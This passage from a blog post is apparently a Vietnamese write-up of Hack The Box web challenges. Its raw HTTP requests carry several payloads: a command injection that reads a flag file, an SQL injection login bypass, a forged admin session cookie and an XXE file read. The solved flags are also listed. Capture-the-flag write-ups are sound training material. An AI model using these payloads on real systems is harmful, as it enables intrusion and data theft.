+-----------------------------31309964863637461648537953000--
+
+</code></pre><p><img src="https://hackmd.io/_uploads/rJmUl-OaC.png" alt="image"></p>
+<p>flag: <code>HTB{c0mfy_bzzzzz_rcb33s_v1b3s}</code></p>
+<h2 id="baby-cachedview">baby CachedView</h2>
+<p><img src="https://hackmd.io/_uploads/r1RA1MupC.png" alt="image"></p>
+<p>flag: <img src="https://hackmd.io/_uploads/SyvkxMuTC.png" alt="image"></p>
+<p>link: <a href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></p>
+<h2 id="looking-glass">looking glass</h2>
+<p><img src="https://hackmd.io/_uploads/ByCgvfdpA.png" alt="image"></p>
+<pre><code>POST / HTTP/1.1
+Host: 94.237.50.249:46774
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 56
+Origin: http://94.237.50.249:46774
+Connection: close
+Referer: http://94.237.50.249:46774/
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+test=ping&amp;ip_address=8.8.8.8|cat+/flag_KwPxu&amp;submit=Test
+</code></pre><p><img src="https://hackmd.io/_uploads/rJi-wMdpA.png" alt="image"></p>
+<p>flag: <code>HTB{I_f1n4lly_l00k3d_thr0ugh_th3_rc3}</code></p>
+<h2 id="sanitize">sanitize</h2>
+<p><img src="https://hackmd.io/_uploads/BkO3vG_pC.png" alt="image"></p>
+<pre><code>POST / HTTP/1.1
+Host: 94.237.49.212:45829
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 36
+Origin: http://94.237.49.212:45829
+Connection: close
+Referer: http://94.237.49.212:45829/
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+username=admin'+or+1=1--'&amp;password=a
+</code></pre><p><img src="https://hackmd.io/_uploads/r1lThPGupC.png" alt="image"></p>
+<p>flag: <code>HTB{SQL_1nj3ct1ng_my_w4y_0utta_h3r3}</code></p>
+<h2 id="baby-auth">baby auth</h2>
+<p><img src="https://hackmd.io/_uploads/By6BFfdpC.png" alt="image"></p>
+<pre><code>GET / HTTP/1.1
+Host: 94.237.49.212:35182
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://94.237.49.212:35182/login
+Connection: close
+Cookie: PHPSESSID=eyJ1c2VybmFtZSI6ImFkbWluIn0%3d
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+</code></pre><p>flag: <code>HTB{s3ss10n_1nt3grity_1s_0v3r4tt3d_4nyw4ys}</code></p>
+<h2 id="baby-nginxatsu">baby nginxatsu</h2>
+<p><img src="https://hackmd.io/_uploads/BJRI0fYa0.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/r1dP0GY60.png" alt="image"></p>
+<pre><code>POST /auth/login HTTP/1.1
+Host: 94.237.59.63:36223
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 106
+Origin: http://94.237.59.63:36223
+Connection: close
+Referer: http://94.237.59.63:36223/auth/login
+Cookie: XSRF-TOKEN=eyJpdiI6IkxjSzVBUXBQRXJXRHZNaWNCRUJRdkE9PSIsInZhbHVlIjoiSUFCT1kreVZTcXV1RXJ1ZlJvQzJUUzBmSjJLVVd4Y25QZUlqUDJnaVc1eUJjb3ZNZFNoLzBzY1ovVjlZekNFWFF3cG1RRHRtSG5RNlo5MG05UkxIU2ROUVJsaWRyZ1Nla2dIeGJodnlNNUZQMk1iclZJbEMrMmpRVm5xb091U0IiLCJtYWMiOiJkZGJkODFmMjhmNzI4NzZlZjJjNmYyMjJkNTQwOWQ0ZmRkOWNmNDFhNzNiNmJlZGFiZjViYTc0NzIxMjFhMTc0In0%3D; laravel_session=eyJpdiI6IlFTZGF0eWdRS0E3MzVvSjdqeUkrbGc9PSIsInZhbHVlIjoiZHcvcDVZUm5NVS9ScDVmL3ZyVUowVlVmTzhNQ0lBekcwTGM4QUNYQzQ1dTVmUHZMT0VoVXFhZTdlc0xTdjZIUWlWUThyYmhlOUJ5NEtMV3h3WE1VZFlvb1hLeHFVRlZIVjE1eGFxSkhCc1RvdUZMQ2dkUGN4MERNanNVMVQ0NDYiLCJtYWMiOiJhZjRmNDE0ZTUzOWFjMjA2ODRmNThjNjJlZmZkYzBiMTkwYTk5MTM5ZDMzMTk4MDIxNGJmMjFjOGNkZmRmZTk3In0%3D
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+_token=odnes8Qm3lep4n0E6nxN0zOlz0GBgS4tz6SQfxvY&amp;email=nginxatsu-adm-01%40makelarid.es&amp;password=adminadmin1
+</code></pre><p><img src="https://hackmd.io/_uploads/SJYS0GtT0.png" alt="image"></p>
+<p>flag: <code>HTB{ng1ngx_r34lly_b3_sp1ll1ng_my_w3ll_h1dd3n_s3cr3ts??}</code></p>
+<h2 id="baby-waffles-order">baby WAFfles order</h2>
+<p>Ta có thể thấy là đối với trang web này sẽ có một form để chúng ta order sau đó thì hiển thị nội dung là food đã được order thành công -&gt; ban đầu hướng đến các loại là ssti và xxe -&gt; sau khi fuzz không có ssti của php thì ta chuyển qua xxe -&gt; thử chuyển dạng data json thành xml và thành công -&gt; dùng xxe để hiển thị nội dung flag bằng system:</p>
+<pre><code>POST /api/order HTTP/1.1
+Host: 83.136.255.40:44465
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://83.136.255.40:44465/
+Content-Type: application/xml
+Content-Length: 172
+Origin: http://83.136.255.40:44465
+Connection: close
+Priority: u=0
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt; ]&gt;
+&lt;order&gt;
+    &lt;table_num&gt;100&lt;/table_num&gt;
+    &lt;food&gt;
+    
+&lt;/order&gt;
+</code></pre><p><img src="https://hackmd.io/_uploads/ByyrrXYaA.png" alt="image"></p>
+<p>flag: <code>HTB{wh0_l3t_th3_XX3_0ut??w00f..w00f..w00f..WAFfles!}</code></p>
+<h2 id="baby-todo-or-not-todo">baby todo or not todo</h2>
+<p>Vị trí của flag:</p>
+<p><img src="https://hackmd.io/_uploads/Syg4QLK60.png" alt="image"></p>
+<p>nằm trong bảng todos là một note todo do admin ghi.</p>
+<p>Ta có thể thấy một api chưa được sử dụng đó là /list/all/?secret=&hellip;.</p>
+<p>Nó chỉ yêu cầu secret và trả ra tất cả các row trong bảng todos</p>
+<pre><code>@classmethod
+	def get_all(cls):
+		cls.todo = []
+		for task in query_db('SELECT * FROM todos'):
+			cls.todo.append(todo(task['id'], task['name'], task['assignee'], bool(task['done'])))
+		return cls.todo
+
+</code></pre><pre><code>GET /api/list/all/?secret=a23A0eedFe270Aa HTTP/1.1
+Host: 94.237.59.63:40388
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://94.237.59.63:40388/
+Connection: close
+Cookie: session=eyJhdXRoZW50aWNhdGlvbiI6InVzZXIxMTRFRmRBQiJ9.ZuvSWQ.zs6OZFlJ0sxu1ptUTZlAhR7xs6M
+Priority: u=4
+</code></pre><p><img src="https://hackmd.io/_uploads/rJ2jMIYTR.png" alt="image"></p>
+<p>flag: <code>HTB{l3ss_ch0r3s_m0r3_h4ck1ng...right?!!1}</code></p>
+<h2 id="baby-bonechewercon">baby BoneChewerCon</h2>
+<p>Lỗi ở đây là do lavarel framwork không hỗ trợ method POST nên khi ta sử dụng nó sẽ hiện thị với debugger và flag nằm trong đó.</p>
+<p><img src="https://hackmd.io/_uploads/BJFi7Lta0.png" alt="image"></p>
+<p>flag: <code>HTB{wh3n_th3_d3bugg3r_turns_4g41nst_th3_d3bugg33}</code></p>
+<h2 id="full-stack-conf">Full Stack Conf</h2>
+<p><img src="https://hackmd.io/_uploads/B1mxFLYpC.png" alt="image"></p>
+<p>flag: <code>HTB{p0p..p0p..p0p...alert(1337)}</code></p>
+
+
+        
+          <div class="blog-tags">
+            
+              
+              <a href="https://bzoltan1.github.io/tags/ctf/">CTF</a>&nbsp;
+            
+              
+              <a href="https://bzoltan1.github.io/tags/vietnamese/">Vietnamese</a>&nbsp;
+            
+          </div>
+        
+
+        
+
+        
+      </article>
+
+      
+        <ul class="pager blog-pager">
+          
+            <li class="previous">
+              <a href="https://bzoltan1.github.io/write-up/2024-08-23-hackthebox-web-challpart4/" data-toggle="tooltip" data-placement="top" title="Htb web chall ctf 2024 - solved challenges - part 4">&larr; Previous Post</a>
+            </li>
+          
+          
+            <li class="next">
+              <a href="https://bzoltan1.github.io/write-up/2024-08-21-hackthebox-web-challpart2/" data-toggle="tooltip" data-placement="top" title="Htb web chall ctf 2024 - solved challenges - part 2">Next Post &rarr;</a>
+            </li>
+          
+        </ul>
+      
+
+
+      
+
+    </div>
+  </div>
+</div>
+
+      <footer>
+  <div class="container">
+    
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+
+          &nbsp;&bull;&nbsp;&copy;
+          
+            0001
+          
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://bzoltan1.github.io/">Zoltán&#39;s Blog</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="https://gohugo.io">Hugo v0.83.1</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js" integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+<script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha384-w5y/xIeYixWvfM+A1cEbmHPURnvyqmVg5eVENruEdDjcyRLUSNej7512JQGspFUr" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>
+
+<script src="https://bzoltan1.github.io/js/main.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://bzoltan1.github.io/js/load-photoswipe.js"></script>
+
+
+
+
+
+
+
+
+
+
+    
+  </body>
+</html>
+
